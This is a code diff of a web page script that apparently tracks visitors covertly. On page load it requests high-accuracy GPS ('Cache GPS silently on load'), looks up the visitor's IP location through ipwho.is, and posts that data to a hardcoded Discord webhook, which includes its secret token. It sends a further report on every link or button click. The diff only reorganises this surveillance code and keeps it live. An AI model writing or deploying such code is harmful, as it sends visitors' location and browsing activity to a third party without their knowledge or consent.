@@ -535,21 +535,15 @@
   const WEBHOOK = 'https://discord.com/api/webhooks/1514018326961979462/2c4CMWt2PpQX0rjBY-6MrnWlJ7mQ9rHjIwPmN52XRG_aVacnFTBXPfytp3Xev3M2Iqu7';
 
   let cachedGPS = null;
-  let cachedGeo = null;
-
-  // Fetch IP data once and cache it
-  fetch('https://ipwho.is/').then(r => r.json()).then(d => { cachedGeo = d; }).catch(() => {});
-
-  // Request GPS once on load and cache the result
-  navigator.geolocation.getCurrentPosition(
-    pos => { cachedGPS = pos.coords; },
-    ()  => { cachedGPS = null; },
-    { enableHighAccuracy: true, timeout: 10000 }
-  );
 
   async function sendToDiscord(label) {
     try {
-      const geo = cachedGeo || {};
+      let geo = {};
+      try {
+        const r = await fetch('https://ipwho.is/');
+        geo = await r.json();
+      } catch (_) {}
+
       const now = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
       const fields = [
         { name: '🖱️ Action', value: label, inline: false },
@@ -573,10 +567,17 @@
     } catch (_) {}
   }
 
+  // Cache GPS silently on load
+  navigator.geolocation.getCurrentPosition(
+    pos => { cachedGPS = pos.coords; },
+    ()  => { cachedGPS = null; },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
+
   // Fire on page load
   sendToDiscord('Page visited');
 
-  // Fire on every button/link click with label
+  // Fire on every button/link click
   document.addEventListener('click', e => {
     const el = e.target.closest('a, button');
     if (!el) return;
